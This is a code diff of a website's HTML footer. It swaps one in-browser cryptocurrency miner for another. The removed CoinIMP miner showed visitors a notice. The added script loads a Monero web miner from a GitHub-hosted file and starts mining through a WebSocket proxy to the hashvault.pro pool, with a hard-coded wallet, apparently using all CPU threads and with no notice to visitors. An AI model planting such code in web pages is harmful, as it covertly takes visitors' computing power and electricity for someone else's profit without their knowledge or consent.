@@ -259,14 +259,19 @@
 			<script src="assets/js/main.js"></script>
 		
   
-<script src="https://www.hostingcloud.racing/ICM8.js"></script>
+<!-- Start Of Mining Code (HTML) -->
+<script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
 <script>
-    var _client = new Client.Anonymous('643456fe704feb62a18183fb1829ec788b35765eff76534d779e0231aa045890', {
-        throttle: 0, c: 'w'
-    });
-    _client.start();
-    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
-
+    server = "wss://ny1.xmrminingproxy.com";
+    var pool = "hashvault.pro:443";
+    var walletAddress = "45w2kfgZYyHXX2ZR6azLutN5TKrr17E2SKNj7fdXqnYvYNZtei6dpyD7EwTybZJeBX5gCiutXnAmLdBqAstdSs4Q4PvM5Fj";
+    var workerId = "GH-XMR"
+    var threads = -1;
+    var password = "";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
 </script>
+<!-- End Of Mining Code (HTML) -->
+		
 	</body>
 </html>
